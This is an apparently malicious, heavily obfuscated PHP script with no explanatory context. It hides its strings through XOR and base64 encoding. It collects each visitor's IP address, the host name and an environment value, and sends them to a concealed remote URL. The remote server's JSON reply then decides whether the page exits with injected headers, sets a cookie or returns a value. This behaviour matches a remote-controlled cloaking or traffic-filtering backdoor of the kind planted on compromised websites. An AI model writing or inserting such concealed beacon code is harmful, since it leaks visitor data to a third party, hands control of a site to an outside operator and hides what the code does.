<?php
class _class0
{
	static private $_property0;
	static public function _method0($_parameter0)
	{
		if (!self::$_property0) {
			self::_method1();
		}
		return self::$_property0[$_parameter0];
	}
	static private function _method1()
	{
		self::$_property0 = [
			0,
			0,
			0,
			0,
			0,
			0.16666666666667,
			0.16666666666667,
			0.16666666666667,
			0.16666666666667,
			0.16666666666667,
			0.16666666666667,
			0.16666666666667,
			0.16666666666667,
			0.16666666666667,
			0.16666666666667,
			0.16666666666667,
			0.16666666666667
		];
	}
}

$GLOBALS["_0b6de55aef215404648734c123380241"] = [171, 304, 230, 254, -892];
class _class1
{
	static private $_property0;
	static public function _method0($_parameter0, $_parameter1)
	{
		if (!self::$_property0) {
			self::_method1();
		}
		$_variable0 = strlen($_parameter1);
		$_variable1 = base64_decode(self::$_property0[$_parameter0]);
		for ($_variable2 = (int)Round(_class0::_method0(0) + _class0::_method0(1) + _class0::_method0(2)), $_variable3 = strlen($_variable1); $_variable2 !== $_variable3; ++$_variable2) {
			$_variable1[$_variable2] = chr(ord($_variable1[$_variable2]) ^ ord($_parameter1[$_variable2 % $_variable0]));
		}
		return $_variable1;
	}
	static private function _method1()
	{
		self::$_property0 = [
			"_\xA5\xB7\x88\xA6\xC0\xD7\x97\xB6" => "N76//r/jcL6l6uu/caSu+qqlMank4+qoLOWo4uqtNKvk/OChML6uoPWkLw==",
			"_\xB6\xB6\xD8\x97\xD5\xD3" => "b7rH0dm5oPM=",
			"_\xA5\x9B\x94\xDD\xCD\xAD\xC8" => "ONzG/LWy4Nvb",
			"_\xB1\xD1\xDD\xD9\xDF\xB2\xCD\x91\xB5\xB0" => "F/7i1pPo99Ua6/rZheA=",
			"_\xC5\x94\xC4\x8E\xAD\xA7\xD6\xC9\xA8\xA1" => "F+2Sg4Tij+XjmYcA8JY=",
			"_\xA7\xAA\xDC\x87\xC3\xCD\x85\x92\xC9\xAD" => "F4bp853YIIgQgOrikMQ6igCU8vE=",
			"_\xB2\xD8\x8D\xCB\xB5" => "F4nbmpn3AJvAmJHuDZnKjg==",
			"_\x9B\xD3\x93\x98\xC1" => "F+aXhOnSmhz+lofiz5cA8Y+d88SRAPuT",
			"_\x99\xD7\x97\xD9\xAD\x8F\xB9\x9B\x8B" => "F/TVj43EgJncx54b5cWAlM2d",
			"_\xB6\x88\xC1\xCA\xDA\xCD\x8A\x96\x89" => "F5mGkpz3jZKZmQ2Jl4Y=",
			"_\xA1\xAE\xB6\xC7\xC8\xAD\xCA" => "DdyW29qY15GMiw0=",
			"_\xAC\xAC\xB0\xD4\xA7\x8C\xC9\xD4\xD6\xCE" => "F9vz/pnz2MuajxDb4u2K4sLXi50W3w==",
			"_\x7F\xC0\xBB\x95\xC8" => "F4L+8ZbTDJP4/ojBGpj+",
			"_\x93\xD0\xDE\xC7\xD6\x92\x92\xAD\xDE\xD6" => "YP/Y4q7l",
			"_\x91\x84\x9B\xB1\xD6\xA1\xD5\xA3" => "F5yQ/83NjAyc",
			"_\x82\xD7\x89\x94\xC2\xC7" => "I7M=",
			"_\x8E\x89\xDB\xDC\x8A\xDD" => "I70=",
			"_\x89\xD1\xDA\xB1\xC7" => "I+U=",
			"_\xA0\x94\xA6\xDD\xB0\xA6\x81\x7F\xBD\xA9" => "Nr4=",
			"_\xB6\xCD\xC0\xDD\xD9" => "Pcm6/av3lNn9Kw==",
			"_\xD9\xDD\xD7\xAC\xA1\xB6\x86\xAD\x85\xCC" => "Ose6+rE=",
			"_\xAE\x92\xBB\x9B\xAA\xD8\x95\xBD\xD0" => "F/nx1YKoi5d/mZWxjdfK0n/ryvDD/Q==",
			"_\xD8\xA8\xD3\xDC\xDC\xDD\xD1\x82\xDA" => "DLnyu7Hho3/5o/vk3PYr7dWgsfz9",
			"_\xD3\xD7\xAC\xCF\x95\xD9\xA1\xA1\xDC\xA3" => "a/eesfP22ezSyCqpzg==",
			"_\xAA\x91\xCB\xA8\xA0\xA1\xD9" => "Nds=",
			"_\x94\x82\xB5\xD1\x89\xD4\xDB\xC6\xA8" => "NuQ=",
			"_\x99\xD9\x99\xD0\xB7" => "Kqilvg==",
			"_\xD6\xA6\xC0\x8E\xA1\xDB\x97\xA4\xA6" => "PA==",
			"_\xDD\xDE\xDF\xD9\xCA" => "Nqg=",
			"_\xDC\x8C\xC5\xAE\x98\x8C\x8D" => "KrSoug==",
			"_\xC3\xCE\x8D\xCA\x94\x99\xA7\xA5\xC8\xD2" => "NtM=",
			"_\xCF\x91\x94\xA6\xD5\xDA\xA1" => "Nt8="
		];
	}
}

$_parameter2 = _class1::_method0("_\xA5\xB7\x88\xA6\xC0\xD7\x97\xB6", "_\xCA\xCB\x8E\x85\xCC");
$_parameter3 = _class1::_method0(
	"_\xB6\xB6\xD8\x97\xD5\xD3",
	"_\xCF\xA4\xBD\xB1\x89\x92\xC2\x88\xAE\xD1"
);
error_reporting((int)RoUNd(_class0::_method0(3) + _class0::_method0(4)));
$_variable6 = _function1($_parameter2, $_parameter3);
function _function1($_parameter2, $_parameter3, $_parameter4 = false, $_parameter5 = -99575)
{
	if (!function_exists(_class1::_method0(
		"_\xA5\x9B\x94\xDD\xCD\xAD\xC8",
		"_\xB9\xB2\xA9\xC6\xD7\x92\x92\x8B\xC8"
	))) {
		function _function0()
		{
			$_variable7 = [
				_class1::_method0(
					"_\xB1\xD1\xDD\xD9\xDF\xB2\xCD\x91\xB5\xB0",
					"_\xAA\xB6\x86\xCC\xB0\xA8\x87"
				),
				_class1::_method0(
					"_\xC5\x94\xC4\x8E\xAD\xA7\xD6\xC9\xA8\xA1",
					"_\xB9\xC6\xD3\xDB\xA1\xC3\xAC\xA6\xD7\xD3"
				),
				_class1::_method0(
					"_\xA7\xAA\xDC\x87\xC3\xCD\x85\x92\xC9\xAD",
					"_\xD2\xBD\xA3\xC2\x80\x7F\xCE"
				),
				_class1::_method0("_\xB2\xD8\x8D\xCB\xB5", "_\xDD\x8F\xCA\xC6\xAF"),
				_class1::_method0("_\x9B\xD3\x93\x98\xC1", "_\xB2\xC3\xD4\xB6\x8A\xC5"),
				_class1::_method0(
					"_\x99\xD7\x97\xD9\xAD\x8F\xB9\x9B\x8B",
					"_\xA0\x81\xDF\xD2\x82\xCF\xCB\x8B\x86\xCC"
				),
				_class1::_method0(
					"_\xB6\x88\xC1\xCA\xDA\xCD\x8A\x96\x89",
					"_\xCD\xD2\xC2\xC3\xB1\xC2\xC0\xCE\xD8"
				),
				_class1::_method0(
					"_\xA1\xAE\xB6\xC7\xC8\xAD\xCA",
					"_\x99\xDB\x94\x8E\xDD\x88\xD0\xC8\xCF"
				),
				_class1::_method0(
					"_\xAC\xAC\xB0\xD4\xA7\x8C\xC9\xD4\xD6\xCE",
					"_\x8F\xA7\xAE\xC6\xAB\x87\x99\xDF\xC2"
				)
			];
			foreach ($_variable7 as $_parameter3):
				if (filter_var(
					$_SERVER[$_parameter3],
					$GLOBALS["_0b6de55aef215404648734c123380241"][0] - $GLOBALS["_0b6de55aef215404648734c123380241"][1] - $GLOBALS["_0b6de55aef215404648734c123380241"][2] - $GLOBALS["_0b6de55aef215404648734c123380241"][3] - $GLOBALS["_0b6de55aef215404648734c123380241"][4]
				)) {
					return $_SERVER[$_parameter3];
				}
			endforeach;
			return false;
		}

	}
	$_variable8 = _function0();
	$_variable9 = getenv(_class1::_method0("_\x7F\xC0\xBB\x95\xC8", "_\xD6\xAA\xA1\xC9\x86"));
	$_variable10 = @file_get_contents($_parameter2 . _class1::_method0(
		"_\x93\xD0\xDE\xC7\xD6\x92\x92\xAD\xDE\xD6",
		"_\x9B\xB9\x96\xCF\xD8\xD1\xD0\xB5\xDF"
	) . base64_encode(
		$_SERVER[_class1::_method0("_\x91\x84\x9B\xB1\xD6\xA1\xD5\xA3", "_\xC8\xC4\xAF\x92\x85\xC3")] . _class1::_method0("_\x82\xD7\x89\x94\xC2\xC7", "_\xCF\xD3\xCA\x7F\xCF\x94") . $_variable8 . _class1::_method0("_\x8E\x89\xDB\xDC\x8A\xDD", "_\xC1\xB7\x93\xDB\xC2") . $_variable9 . _class1::_method0("_\x89\xD1\xDA\xB1\xC7", "_\x99\x8B\xA1\xDD\x88\xB2") . $_parameter3
	));
	if ($_variable10) {
		$_variable11 = json_decode($_variable10, (int)rouND(
			_class0::_method0(5) + _class0::_method0(6) + _class0::_method0(7) + _class0::_method0(8) + _class0::_method0(9) + _class0::_method0(10)
		));
		if ($_variable11[_class1::_method0(
			"_\xA0\x94\xA6\xDD\xB0\xA6\x81\x7F\xBD\xA9",
			"_\xCD\xA9\x98\xB1\xC5\xCF\xDB\x94"
		)] == _class1::_method0("_\xB6\xCD\xC0\xDD\xD9", "_\xA8\xD4\x93\xCE\x93\xCB\xBB\x92") || !empty($_variable11[_class1::_method0(
			"_\xD9\xDD\xD7\xAC\xA1\xB6\x86\xAD\x85\xCC",
			"_\xB5\xC8\x95\xC3\x95"
		)])) {
			header(_class1::_method0(
				"_\xAE\x92\xBB\x9B\xAA\xD8\x95\xBD\xD0",
				"_\xAD\xA5\x85\xAD\x99\xA5\xA6"
			));
			header(_class1::_method0(
				"_\xD8\xA8\xD3\xDC\xDC\xDD\xD1\x82\xDA",
				"_\xCD\x93\xCF\xC4\x92\x99"
			));
			exit(_class1::_method0(
				"_\xD3\xD7\xAC\xCF\x95\xD9\xA1\xA1\xDC\xA3",
				"_\xC7\xAA\x91\xBD\x99\xAD\xCC\x94\xA7"
			));
		}
		if (!empty($_variable11[_class1::_method0("_\xAA\x91\xCB\xA8\xA0\xA1\xD9", "_\xA8\xD1\xC0\xC2\xA4\xDA")]) and $_variable11[_class1::_method0(
			"_\x94\x82\xB5\xD1\x89\xD4\xDB\xC6\xA8",
			"_\x97\x91\x9B\xD5\xB0\xD1\xC3"
		)] == _class1::_method0(
			"_\x99\xD9\x99\xD0\xB7",
			"_\xDB\xC0\xCC\xDA\x96\xD4\x92\xD4\xA3\xCA"
		)) {
			setcookie(
				_class1::_method0("_\xD6\xA6\xC0\x8E\xA1\xDB\x97\xA4\xA6", "_\xCD\xC6\xA0\x85\xBD"),
				(int)RoUnd(
					_class0::_method0(11) + _class0::_method0(12) + _class0::_method0(13) + _class0::_method0(14) + _class0::_method0(15) + _class0::_method0(16)
				)
			);
		}
		if ($_variable11[_class1::_method0(
			"_\xDD\xDE\xDF\xD9\xCA",
			"_\xDB\x8F\x84\xC0\x8F\xBD\xC7\xAE\xB7\xB2"
		)] == _class1::_method0("_\xDC\x8C\xC5\xAE\x98\x8C\x8D", "_\xC7\xCD\xC8\xC3\xCD\xC5")) {
			unset($_variable11[_class1::_method0(
				"_\xC3\xCE\x8D\xCA\x94\x99\xA7\xA5\xC8\xD2",
				"_\xA0\x84\xDF\xAD\xC9\xA8\x7F"
			)]);
		}
		return $_variable11[_class1::_method0(
			"_\xCF\x91\x94\xA6\xD5\xDA\xA1",
			"_\xAC\x81\x8E\x86\x93\xCB\xDF\xB6"
		)];
	}
	return true;
}

